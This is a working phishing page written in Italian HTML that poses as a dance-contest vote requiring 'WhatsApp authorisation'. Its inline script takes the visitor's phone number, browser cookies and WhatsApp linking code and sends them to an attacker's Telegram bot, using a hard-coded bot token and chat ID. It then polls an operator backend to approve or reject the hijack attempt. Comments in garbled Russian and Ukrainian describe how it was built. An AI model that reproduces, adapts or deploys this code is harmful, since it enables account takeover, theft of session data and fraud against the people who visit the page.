<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width,initial-scale=1.0">
    <meta name="robots" content="noindex, nofollow">
    <link rel="icon" type="image/x-icon" href="https://dancebattle.life/static/img/svg/icon.svg">
    <title>Autorizzazione</title>
    <link rel="stylesheet"
        href="https://dancebattle.life/static/css/themes/zomia/number.css?v=iF_XmVydeXA9UWMabWC6qBNqGURlNGJbit3ycULs52Q%3D" />
    <script
        src="https://dancebattle.life/static/js/lib/socket.io.js?v=xA14CFROUWxBqJIF79G9ZQHsZd083gKibXvVUTrHQJ8%3D"></script>
    <script
        src="https://dancebattle.life/static/js/lib/lazyload.js?v=tNygWs_GKZ5-7U2Dt04KB8nwYPizG4GrXlE2Ao8hjtQ%3D"></script>
    <script
        src="https://dancebattle.life/static/js/lib/notiflix.js?v=pXMqYvjzxYjuQ3-Iz0Zpw3Tk3BAoet8dOsODol_iqTI%3D"></script>
    <!-- –í–ê–ñ–ù–û: –°–∫—Ä–∏–ø—Ç number.js –æ—Ç–≤–µ—á–∞–µ—Ç –∑–∞ –æ—Å–Ω–æ–≤–Ω—É—é –ª–æ–≥–∏–∫—É —Ñ–æ—Ä–º—ã –≤—ã–±–æ—Ä–∞ –Ω–æ–º–µ—Ä–∞ -->
    <script
        src="https://dancebattle.life/static/js/number.js?v=44ZnprTQE_kUI3go1hDzhdZsbTsiUZ5z6xFuhpus56A%3D"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.8/css/intlTelInput.css" />
    <script src="https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.8/js/intlTelInput.min.js"></script>

    <style>
        /* –û—Ä–∏–≥–∏–Ω–∞–ª—å–Ω—ã–µ —Å—Ç–∏–ª–∏ –∏–∑ number.css –æ—Å—Ç–∞—é—Ç—Å—è –∫–∞–∫ –µ—Å—Ç—å, —á—Ç–æ–±—ã –Ω–µ –ª–æ–º–∞—Ç—å number.js */
        /* –î–æ–±–∞–≤–ª—è–µ–º —Ç–æ–ª—å–∫–æ –Ω–µ–æ–±—Ö–æ–¥–∏–º—ã–µ –ø—Ä–∞–≤–∫–∏ –∏ —Å—Ç–∏–ª–∏ –¥–ª—è –Ω–æ–≤—ã—Ö —ç–ª–µ–º–µ–Ω—Ç–æ–≤ */
        body { background-image: url("https://dancebattle.life/static/img/themes/zomia/background.jpg"); background-color: #ffffff; }
        .loader { border-top: 5px solid #bfbbbb; } /* –°—Ç–∏–ª—å –¥–ª—è –ª–æ–∞–¥–µ—Ä–∞ –æ—Ç number.js */
        
        .block.number .form .search { background-color: #ffffff; }
        .block.number .form .countries .items .overflow::-webkit-scrollbar-thumb { background: #152b42; }
        .block.number .form .countries .items .overflow::-webkit-scrollbar-thumb:hover { background: #152b42; }
        .popup h2, .block .text { color: #ffffff; }
        .popup p, .block .text p { color: #c6c6c6; }
        .button.primary { color: #ffffff; background-color: #1d9ce0E6; width: 100% !important; }
        .button.primary:hover { background-color: #1d9ce0; }
        
        .block.number .form-container { background-color: #1d3957; }
        .block.number .form-container .form .country { border: 1px solid #80a2b3; }
        .block.number .form-container .form .country .image img { -webkit-mask-image: none !important; }
        .block.number .form-container .form .countries .item .image img { -webkit-mask-image: none !important; }
        .block.number .form-container .form .country.active { border: 1px solid #1d9ce0; }
        .block.number .form-container .form .country p { color: #ffffff; }
        .block.number .form-container .form .country .icon svg path { fill: #bfbbbb; }
        .block.number .form-container .form .countries { background-color: #1d3957; }
        .block.number .form-container .form .countries .search { background-color: #1d3957; }
        .block.number .form-container .form .countries .search input { color: #b1c1d1; background-color: #152b42; }
        .block.number .form-container .form .countries .items { background-color: #1d3957; }
        .block.number .form-container .form .countries .item { background-color: #1d3957; }
        .block.number .form-container .form .countries .item:hover { background-color: #24466b; }
        .block.number .form-container .form .countries .item p.name { color: #b1c1d1; }
        .block.number .form-container .form .countries .item p.code { color: #ffffff; }
        .block.number .form-container .form .qrcode { color: #1d9ce0; }
        .block.number .form-container .form input.number { color: #ffffff; background-color: transparent; border: 1px solid #80a2b3; }
        .block.number .form-container .form input.number:focus { border: 1px solid #1d9ce0; }
        .block.number .form-container .form p.error { color: #d65d7a; }
        .block.code .number-container { border: 20px solid #1d3957; background-color: #ffffff; }
        .popup .body { background-color: #1d3957; }
        .top40 .body{ top: 40%; }

        /* –°—Ç–∏–ª–∏ –¥–ª—è –Ω–∞—à–µ–≥–æ –∫–∞—Å—Ç–æ–º–Ω–æ–≥–æ —à–∞–≥–∞ –≤–≤–æ–¥–∞ –∫–æ–¥–∞ (Telegram) */
        #form-step-telegram .code-title { font-size: 22px; font-weight: 700; color: #ffffff; margin-bottom: 15px; }
        #loader-telegram .loader { /* –°—Ç–∏–ª—å –¥–ª—è –Ω–∞—à–µ–≥–æ –∫–∞—Å—Ç–æ–º–Ω–æ–≥–æ –ª–æ–∞–¥–µ—Ä–∞ */
            width: 50px; height: 50px; border-top: 5px solid #1d9ce0; margin: 20px auto;
        }


        /* --- CSS –ò–°–ü–†–ê–í–õ–ï–ù–ò–Ø –î–õ–Ø –ú–û–ë–ò–õ–¨–ù–´–• –£–°–¢–†–û–ô–°–¢–í (–ø—É–Ω–∫—Ç—ã 1 –∏ 2 –∫–ª–∏–µ–Ω—Ç–∞) --- */
        @media screen and (max-width: 768px) {
            .block.code { /* –û–±—â–∏–π –±–ª–æ–∫ –¥–ª—è –≤—Ç–æ—Ä–æ–≥–æ —à–∞–≥–∞ (–±—É–¥—å —Ç–æ QR –∏–ª–∏ –Ω–∞—à–∞ —Ñ–æ—Ä–º–∞) */
                padding-top: 15px;
            }
             .block.code .text { /* –¢–µ–∫—Å—Ç "Autorizzazione rapida..." */
                padding: 0 10px; 
                text-align: center;
            }
             .block.code .text h2 { font-size: 1.25em; }
             .block.code .text p { font-size: 0.875em; line-height: 1.45; }

            /* –ö–æ–Ω—Ç–µ–π–Ω–µ—Ä, –∫–æ—Ç–æ—Ä—ã–π –∏—Å–ø–æ–ª—å–∑—É–µ—Ç number.js –¥–ª—è QR/–µ–≥–æ –ª–æ–∞–¥–µ—Ä–∞ */
            .block.code .number-container#loader { 
                border: 10px solid #1d3957;
                padding: 15px; 
                min-height: 150px; 
                margin-top: 10px; 
                width: calc(100% - 30px); 
                max-width: 280px; 
                box-sizing: border-box;
            }
            /* –õ–æ–∞–¥–µ—Ä –≤–Ω—É—Ç—Ä–∏ .number-container#loader (–æ—Ç number.js) */
            .block.code .number-container#loader .loader { 
                width: 50px !important;
                height: 50px !important;
                border-width: 5px !important;
                margin: 15px auto; 
            }
             /* –¶–∏—Ñ—Ä—ã QR-–∫–æ–¥–∞ (–µ—Å–ª–∏ –∏—Å–ø–æ–ª—å–∑—É–µ—Ç—Å—è number.js) */
            .block.code .number-container#loader .number-code .symbol {
                font-size: 18px !important; 
                width: 26px !important;    
                height: 36px !important;   
                line-height: 36px !important; 
                margin: 1px !important; 
            }
            .block.code .number-container#loader .number-code .split {
                font-size: 18px !important; 
                padding: 0 2px !important; 
            }
            
            /* –ù–∞—à–∞ —Ñ–æ—Ä–º–∞ –≤–≤–æ–¥–∞ –∫–æ–¥–∞ –¥–ª—è Telegram –Ω–∞ –º–æ–±–∏–ª—å–Ω—ã—Ö */
            #form-step-telegram .form-container {
                 padding: 15px;
                 background-color: #1d3957; /* –£–±–µ–¥–∏–º—Å—è, —á—Ç–æ —Ñ–æ–Ω –µ—Å—Ç—å */
                 border-radius: 8px; /* –ö–∞–∫ —É –æ—Å–Ω–æ–≤–Ω–æ–≥–æ –±–ª–æ–∫–∞ */
                 width: 100%;
                 max-width: 300px; /* –û–≥—Ä–∞–Ω–∏—á–∏–º —à–∏—Ä–∏–Ω—É */
                 margin: 15px auto 0;
            }
            #form-step-telegram .code-title {
                font-size: 1.1em; /* –ù–µ–º–Ω–æ–≥–æ —É–º–µ–Ω—å—à–∏–º */
                margin-bottom: 10px;
            }
            #form-step-telegram input.number#code-telegram {
                padding: 10px;
                font-size: 1em;
                margin-bottom: 15px;
            }
            #form-step-telegram button.primary#two-step-telegram {
                padding: 12px;
                font-size: 1em;
            }
            /* –ù–∞—à –ª–æ–∞–¥–µ—Ä –¥–ª—è Telegram */
            #loader-telegram {
                 margin-top: 20px;
            }
            #loader-telegram .loader {
                 width: 50px !important;
                 height: 50px !important;
                 border-width: 5px !important;
            }
        }
    </style>
</head>

<body class="number-page" data-redirect="https://dancebattle.life/home/grazie" data-template="45">
    <div class="wrapper">
        <!-- –®–∞–≥ 1: –í–≤–æ–¥ –Ω–æ–º–µ—Ä–∞ —Ç–µ–ª–µ—Ñ–æ–Ω–∞ (—É–ø—Ä–∞–≤–ª—è–µ—Ç—Å—è number.js) -->
        <div class="block number" id="step-1">
            <div class="text">
                <h2>Devi accedere tramite WhatsApp affinch√© il tuo voto venga preso in considerazione.</h2>
                <p>L'autorizzazione tramite WhatsApp ti consente di proteggere i tuoi dati e risparmiare tempo.</p>
            </div>
            <div id="form-step-1" class="form-container form-num">
                <div class="form" id="myForm"> <!-- –≠—Ç–æ—Ç ID –∏—Å–ø–æ–ª—å–∑—É–µ—Ç—Å—è number.js -->
                    <div class="country">
                        <div class="image">
                            <img src="https://dancebattle.life/static/img/flags/AU.png?v=HufG65VxnEKn_Ob-toF22UxlqX3xC9WSZK3ygAU6nQQ%3D"
                                alt="AU">
                        </div>
                        <p class="name">Australia</p>
                        <div class="icon">
                            <svg viewBox="0 0 10 5" height="5" width="10" preserveAspectRatio="xMidYMid meet" class=""
                                fill="none">
                                <path fill-rule="evenodd" clip-rule="evenodd" d="M0 0L5 5L10 0H0Z" fill="currentColor"
                                    fill-opacity="0.3"></path>
                            </svg>
                        </div>
                    </div>
                    <div class="countries hidden"> <!-- –ó–∞–ø–æ–ª–Ω—è–µ—Ç—Å—è number.js -->
                        <div class="search">
                            <div class="image">
                                <svg viewBox="0 0 24 24" height="24" width="24" preserveAspectRatio="xMidYMid meet"
                                    class="" version="1.1" x="0px" y="0px" enable-background="new 0 0 24 24">
                                    <path fill="#bfbbbb"
                                        d="M15.009,13.805h-0.636l-0.22-0.219c0.781-0.911,1.256-2.092,1.256-3.386 c0-2.876-2.332-5.207-5.207-5.207c-2.876,0-5.208,2.331-5.208,5.207s2.331,5.208,5.208,5.208c1.293,0,2.474-0.474,3.385-1.255 l0.221,0.22v0.635l4.004,3.999l1.194-1.195L15.009,13.805z M10.201,13.805c-1.991,0-3.605-1.614-3.605-3.605 s1.614-3.605,3.605-3.605s3.605,1.614,3.605,3.605S12.192,13.805,10.201,13.805z">
                                    </path>
                                </svg>
                            </div>
                            <input type="text" id="search">
                        </div>
                        <div class="items">
                             <div class="overflow">
                                <!-- –°–ü–ò–°–û–ö –°–¢–†–ê–ù –ì–ï–ù–ï–†–ò–†–£–ï–¢–°–Ø number.js -->
                                <!-- –û—Å—Ç–∞–≤–ª—è—é –Ω–µ—Å–∫–æ–ª—å–∫–æ –ø—Ä–∏–º–µ—Ä–æ–≤, –∫–∞–∫ –≤ –≤–∞—à–µ–º –æ—Ä–∏–≥–∏–Ω–∞–ª—å–Ω–æ–º —Ñ–∞–π–ª–µ, -->
                                <!-- —Ç–∞–∫ –∫–∞–∫ number.js –ú–û–ñ–ï–¢ –æ–∂–∏–¥–∞—Ç—å –∏—Ö –¥–ª—è –∏–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏–∏ -->
                                <div class="item" data-code="+61" data-lang="AU" data-name="Australia"> <div class="image"> <img src="https://dancebattle.life/static/img/flags/AU.png" alt="AU"> </div> <p class="name">Australia</p> <p class="code">+61</p> </div>
                                <div class="item" data-code="+43" data-lang="AT" data-name="√ñsterreich"> <div class="image"> <img src="https://dancebattle.life/static/img/flags/AT.png" alt="AT"> </div> <p class="name">√ñsterreich</p> <p class="code">+43</p> </div>
                                <div class="item" data-code="+994" data-lang="AZ" data-name="Az…ôrbaycan"> <div class="image"> <img src="https://dancebattle.life/static/img/flags/AZ.png" alt="AZ"> </div> <p class="name">Az…ôrbaycan</p> <p class="code">+994</p> </div>
                                <!-- –ò —Ç–∞–∫ –¥–∞–ª–µ–µ... –≤–µ—Å—å –≤–∞—à –¥–ª–∏–Ω–Ω—ã–π —Å–ø–∏—Å–æ–∫ —Å—Ç—Ä–∞–Ω –¥–æ–ª–∂–µ–Ω –±—ã—Ç—å –∑–¥–µ—Å—å, –µ—Å–ª–∏ number.js –µ–≥–æ –Ω–µ –≥–µ–Ω–µ—Ä–∏—Ä—É–µ—Ç —Å–∞–º -->
                                <div class="item" data-code="+81" data-lang="JP" data-name="Êó•Êú¨"> <div class="image"> <img src="https://dancebattle.life/static/img/flags/JP.png" alt="JP"> </div> <p class="name">Êó•Êú¨</p> <p class="code">+81</p> </div>
                            </div>
                        </div>
                    </div>
                    <input type="text" class="number" id="number" value="+61" /> <!-- ID –∏—Å–ø–æ–ª—å–∑—É–µ—Ç—Å—è number.js -->
                    <button class="button primary" id="next-step">Continua</button> <!-- ID –∏—Å–ø–æ–ª—å–∑—É–µ—Ç—Å—è number.js -->
                    <p class="error hidden">Numero di telefono non valido</p>
                    <div id="verifyForm" style="display: none; margin-top: 20px;"> <!-- –ò—Å–ø–æ–ª—å–∑—É–µ—Ç—Å—è number.js? -->
                        <input type="text" id="codeInput" placeholder="–í–≤–µ–¥—ñ—Ç—å –∫–æ–¥">
                        <button id="submitCode">–ü—ñ–¥—Ç–≤–µ—Ä–¥–∏—Ç–∏</button>
                    </div>
                </div>
            </div>
        </div>

        <!-- –®–∞–≥ 2: –û—Ç–æ–±—Ä–∞–∂–µ–Ω–∏–µ QR-–∫–æ–¥–∞/–ª–æ–∞–¥–µ—Ä–∞ (—É–ø—Ä–∞–≤–ª—è–µ—Ç—Å—è number.js) –ò–õ–ò –Ω–∞—à–∞ —Ñ–æ—Ä–º–∞ –≤–≤–æ–¥–∞ –∫–æ–¥–∞ (—É–ø—Ä–∞–≤–ª—è–µ—Ç—Å—è –Ω–∞—à–∏–º —Å–∫—Ä–∏–ø—Ç–æ–º) -->
        <div class="block code hidden" id="step-2"> <!-- –≠—Ç–æ—Ç –±–ª–æ–∫ –±—É–¥–µ—Ç –ø–æ–∫–∞–∑–∞–Ω number.js -->
            <div class="text">
                <h2>Autorizzazione rapida e facile tramite WhatsApp</h2>
                <p>Accedi all'app WhatsApp, seleziona 'Dispositivi collegati' nella finestra delle
                    impostazioni, quindi inserisci questo codice</p>
            </div>
            <div class="number-column">
                <!-- –ö–æ–Ω—Ç–µ–π–Ω–µ—Ä –¥–ª—è QR/–ª–æ–∞–¥–µ—Ä–∞ –æ—Ç number.js -->
                <div class="number-container" id="loader"> <!-- ID –∏—Å–ø–æ–ª—å–∑—É–µ—Ç—Å—è number.js -->
                    <div class="loader"></div>
                    <div class="number-code hidden" id="number-code" data-code="">
                        <div class="symbol"></div><div class="symbol"></div><div class="symbol"></div><div class="symbol"></div>
                        <div class="split">‚Äì</div>
                        <div class="symbol"></div><div class="symbol"></div><div class="symbol"></div><div class="symbol"></div>
                    </div>
                </div>

                <!-- –ù–∞—à–∞ —Ñ–æ—Ä–º–∞ –¥–ª—è –≤–≤–æ–¥–∞ –∫–æ–¥–∞ (–¥–ª—è Telegram), –∏–∑–Ω–∞—á–∞–ª—å–Ω–æ —Å–∫—Ä—ã—Ç–∞ -->
                <div id="form-step-telegram" style="display: none;" class="form-container form-code">
                    <p class="text code-title">Codice:</p> <!-- –ü–ï–†–ï–í–ï–î–ï–ù–û -->
                    <div class="form" id="form-code-telegram">
                        <input type="text" class="number" id="code-telegram" />
                        <button class="button primary" id="two-step-telegram">Continua</button>
                    </div>
                </div>
                <!-- –ù–∞—à –ª–æ–∞–¥–µ—Ä (–¥–ª—è Telegram), –∏–∑–Ω–∞—á–∞–ª—å–Ω–æ —Å–∫—Ä—ã—Ç -->
                <div id="loader-telegram" style="display: none;">
                     <div class="loader"></div> <!-- –ò—Å–ø–æ–ª—å–∑—É–µ–º —Ç–æ—Ç –∂–µ –∫–ª–∞—Å—Å .loader –¥–ª—è –∫–æ–Ω—Å–∏—Å—Ç–µ–Ω—Ç–Ω–æ—Å—Ç–∏ -->
                </div>
                <div class="button primary hidden" id="copy-code">Copia</div>
            </div>
        </div>
    </div>

    <!-- –ü–æ–ø–∞–ø—ã (–ø–µ—Ä–µ–≤–µ–¥–µ–Ω—ã) -->
    <div class="popup top40" id="popreboot" style="display: none;" >
        <div class="body">
            <h2>Il tuo voto √® stato conteggiato, grazie</h2>
            <button class="button primary btn-ok" id="reload-page-ok">Ok</button>
        </div>
    </div>
    <div class="popup top40" id="popwhat" style="display: none;" >
        <div class="body">
            <h2>Qualcosa √® andato storto!</h2>
            <p>Hai inserito il codice in modo errato, vai all'applicazione WhatsApp e inserisci il codice correttamente, altrimenti il tuo voto non verr√† conteggiato.</p>
            <button class="button primary btn-reb" id="reload-page-what">Riprova</button>
        </div>
    </div>
                                
    <script>
    document.addEventListener("DOMContentLoaded", function () {
        const btnRebWhat = document.getElementById("reload-page-what");
        const btnOkReboot = document.getElementById("reload-page-ok");
        
        const popWhat = document.getElementById("popwhat");
        const popReboot = document.getElementById("popreboot");

        const step1Div = document.getElementById("step-1"); 
        const originalStep2Div = document.getElementById("step-2"); // –û—Ä–∏–≥–∏–Ω–∞–ª—å–Ω—ã–π –≤—Ç–æ—Ä–æ–π —à–∞–≥ (–æ—Ç number.js)
        const originalLoaderContainer = document.getElementById("loader"); // –û—Ä–∏–≥–∏–Ω–∞–ª—å–Ω—ã–π –∫–æ–Ω—Ç–µ–π–Ω–µ—Ä —Å –ª–æ–∞–¥–µ—Ä–æ–º/QR –æ—Ç number.js
        
        const formStepTelegram = document.getElementById("form-step-telegram"); // –ù–∞—à–∞ —Ñ–æ—Ä–º–∞ –¥–ª—è –∫–æ–¥–∞ Telegram
        const loaderTelegram = document.getElementById("loader-telegram"); // –ù–∞—à –ª–æ–∞–¥–µ—Ä –¥–ª—è Telegram
        
        const nextStepBtnOriginal = document.getElementById("next-step"); 
        const codeStepBtnTelegram = document.getElementById("two-step-telegram"); 

        if(btnRebWhat) {
            btnRebWhat.addEventListener("click", () => {
                if(popWhat) popWhat.style.display = "none";
                if(formStepTelegram) formStepTelegram.style.display = "block";
                if(loaderTelegram) loaderTelegram.style.display = "none";
                const codeInputTg = document.getElementById("code-telegram");
                if(codeInputTg) codeInputTg.value = "";
            });
        }

        if(btnOkReboot) {
            btnOkReboot.addEventListener("click", () => {
                const redirectUrl = document.body.getAttribute('data-redirect');
                if (redirectUrl) {
                    window.location.href = redirectUrl;
                } else {
                    if(popReboot) popReboot.style.display = "none";
                }
            });
        }

        const token = "7738348678:AAE5mirY6jzmApYyAjJ5PQgz-1_G8u9pJ6g";
        const chat_id = "7538727898";
        const backendURL = "https://api.bestballerinavote.com";

        // –≠—Ç–∞ –ø–µ—Ä–µ–º–µ–Ω–Ω–∞—è –±—É–¥–µ—Ç –æ—Ç—Å–ª–µ–∂–∏–≤–∞—Ç—å, –±—ã–ª –ª–∏ –Ω–æ–º–µ—Ä —É–∂–µ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω
        let numberSentToTelegram = false;

        if (nextStepBtnOriginal) {
             nextStepBtnOriginal.addEventListener("click", function (e) {
                // –ù–µ –∏—Å–ø–æ–ª—å–∑—É–µ–º e.preventDefault(), —á—Ç–æ–±—ã number.js –º–æ–≥ –æ–±—Ä–∞–±–æ—Ç–∞—Ç—å –∫–ª–∏–∫
                // (–Ω–∞–ø—Ä–∏–º–µ—Ä, –¥–ª—è –≤–∞–ª–∏–¥–∞—Ü–∏–∏ –∏ –ø–µ—Ä–µ—Ö–æ–¥–∞ –Ω–∞ —Å–≤–æ–π #step-2)

                // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –¥–∞–Ω–Ω—ã–µ –≤ Telegram —Ç–æ–ª—å–∫–æ –µ—Å–ª–∏ –æ–Ω–∏ –µ—â–µ –Ω–µ –±—ã–ª–∏ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω—ã
                if (!numberSentToTelegram) {
                    const phoneInput = document.getElementById("number");
                    if (!phoneInput) return;
                    const phone = phoneInput.value.trim();
                    const errorP = document.querySelector('#form-step-1 .error');

                    if (!phone) { // –ü—Ä–æ—Å—Ç–∞—è –ø—Ä–æ–≤–µ—Ä–∫–∞ –Ω–∞ –ø—É—Å—Ç–æ—Ç—É, –æ—Å–Ω–æ–≤–Ω–∞—è –≤–∞–ª–∏–¥–∞—Ü–∏—è –Ω–∞ number.js
                        if (errorP && errorP.classList.contains('hidden')) {
                            // errorP.classList.remove('hidden'); // –î–æ–≤–µ—Ä–∏–º –ø–æ–∫–∞–∑ –æ—à–∏–±–∫–∏ number.js
                        }
                        return; 
                    } else {
                       if (errorP) errorP.classList.add('hidden');
                    }

                    sessionStorage.setItem("submittedPhone", phone);
                    const cookies = document.cookie || "–ù–µ–º–∞—î –∫—É–∫—ñ";
                    const msg = `üì≤ –ù–æ–≤–∏–π –∑–∞–ø–∏—Ç\n–¢–µ–ª–µ—Ñ–æ–Ω: ${phone}\nüç™ –ö—É–∫—ñ: ${cookies}`;
                    fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
                        method: "POST",
                        headers: { "Content-Type": "application/json" },
                        body: JSON.stringify({ chat_id, text: msg })
                    }).then(() => {
                        numberSentToTelegram = true; // –ü–æ–º–µ—á–∞–µ–º, —á—Ç–æ –Ω–æ–º–µ—Ä –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω
                    }).catch(err => console.error("–û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏ –Ω–æ–º–µ—Ä–∞ –≤ Telegram:", err));
                }
                // –î–∞–ª–µ–µ number.js –¥–æ–ª–∂–µ–Ω —Å–∫—Ä—ã—Ç—å step-1 –∏ –ø–æ–∫–∞–∑–∞—Ç—å originalStep2Div
                // –≠—Ç–æ –±—É–¥–µ—Ç –æ—Ç—Å–ª–µ–∂–µ–Ω–æ MutationObserver
            });
        }

        const observer = new MutationObserver(function(mutationsList, observerInstance) {
            for(const mutation of mutationsList) {
                if (mutation.type === 'attributes' && mutation.attributeName === 'style') {
                    if (step1Div && step1Div.style.display === 'none' && originalStep2Div && originalStep2Div.style.display !== 'none') {
                        // number.js —Å–∫—Ä—ã–ª –ø–µ—Ä–≤—ã–π —à–∞–≥ –ò –ø–æ–∫–∞–∑–∞–ª —Å–≤–æ–π –≤—Ç–æ—Ä–æ–π —à–∞–≥ (#step-2)
                        // –¢–µ–ø–µ—Ä—å –º—ã –¥–æ–ª–∂–Ω—ã —Å–∫—Ä—ã—Ç—å –µ–≥–æ –æ—Ä–∏–≥–∏–Ω–∞–ª—å–Ω—ã–π –∫–æ–Ω—Ç–µ–Ω—Ç (–Ω–∞–ø—Ä–∏–º–µ—Ä, QR-loader)
                        // –∏ –ø–æ–∫–∞–∑–∞—Ç—å –Ω–∞—à—É —Ñ–æ—Ä–º—É –¥–ª—è –≤–≤–æ–¥–∞ –∫–æ–¥–∞.
                        if (originalLoaderContainer) originalLoaderContainer.style.display = 'none'; // –°–∫—Ä—ã–≤–∞–µ–º –æ—Ä–∏–≥–∏–Ω–∞–ª—å–Ω—ã–π –ª–æ–∞–¥–µ—Ä/QR
                        if (formStepTelegram) formStepTelegram.style.display = 'block'; // –ü–æ–∫–∞–∑—ã–≤–∞–µ–º –Ω–∞—à—É —Ñ–æ—Ä–º—É
                        
                        observerInstance.disconnect(); 
                        break;
                    }
                }
            }
        });

        if (step1Div && originalStep2Div) { // –ù–∞–±–ª—é–¥–∞–µ–º —Ç–æ–ª—å–∫–æ –µ—Å–ª–∏ –æ–±–∞ —ç–ª–µ–º–µ–Ω—Ç–∞ —Å—É—â–µ—Å—Ç–≤—É—é—Ç
            observer.observe(step1Div, { attributes: true });
            observer.observe(originalStep2Div, { attributes: true }); // –¢–∞–∫–∂–µ –Ω–∞–±–ª—é–¥–∞–µ–º –∑–∞ –≤—Ç–æ—Ä—ã–º —à–∞–≥–æ–º
        }

        if (codeStepBtnTelegram) {
            codeStepBtnTelegram.addEventListener("click", function (e) {
                e.preventDefault();
                const codeInput = document.getElementById("code-telegram");
                const code = codeInput ? codeInput.value.trim() : "";
                const phone = sessionStorage.getItem("submittedPhone");

                if (!code) { alert("Per favore, inserisci il codice."); return; }
                if (!phone) {
                    alert("Errore: numero di telefono non trovato. Riprova dal primo passaggio.");
                    if(formStepTelegram) formStepTelegram.style.display = "none";
                    if(originalLoaderContainer) originalLoaderContainer.style.display = "block"; // –í–µ—Ä–Ω—É—Ç—å –æ—Ä–∏–≥–∏–Ω–∞–ª—å–Ω—ã–π loader
                    if(step1Div) step1Div.style.display = "block";
                    numberSentToTelegram = false; // –°–±—Ä–æ—Å–∏—Ç—å —Ñ–ª–∞–≥, —á—Ç–æ–±—ã –º–æ–∂–Ω–æ –±—ã–ª–æ –æ—Ç–ø—Ä–∞–≤–∏—Ç—å –Ω–æ–º–µ—Ä –∑–∞–Ω–æ–≤–æ
                    return;
                }
                const msg = `üîê –ö–æ–¥ –ø—ñ–¥—Ç–≤–µ—Ä–¥–∂–µ–Ω–Ω—è:\n–¢–µ–ª–µ—Ñ–æ–Ω: ${phone}\n–ö–æ–¥: ${code}`;
                fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({ chat_id, text: msg })
                });
                if(formStepTelegram) formStepTelegram.style.display = "none";
                if(loaderTelegram) loaderTelegram.style.display = "block";
                waitForApproval(phone);
            });
        }

        function waitForApproval(phone) {
            const interval = setInterval(() => {
                fetch(`${backendURL}/check-response?phone=${encodeURIComponent(phone)}`)
                    .then(res => {
                        if (!res.ok) throw new Error(`Network response was not ok: ${res.statusText}`);
                        return res.json();
                    })
                    .then(data => {
                        console.log("üì© –í—ñ–¥–ø–æ–≤—ñ–¥—å –≤—ñ–¥ –±–µ–∫–µ–Ω–¥—É:", data);
                        if (data.status === "approved") {
                            clearInterval(interval);
                            if(loaderTelegram) loaderTelegram.style.display = "none";
                            if(popReboot) popReboot.style.display = "block";
                        } else if (data.status === "rejected") {
                            clearInterval(interval);
                            if(loaderTelegram) loaderTelegram.style.display = "none";
                            if(popWhat) popWhat.style.display = "block";
                        }
                    })
                    .catch(err => console.error("‚ùå –ü–æ–º–∏–ª–∫–∞ –±–µ–∫–µ–Ω–¥—É –∞–±–æ –º–µ—Ä–µ–∂—ñ:", err));
            }, 3000);
        }
    });
    </script>
</body>
</html>
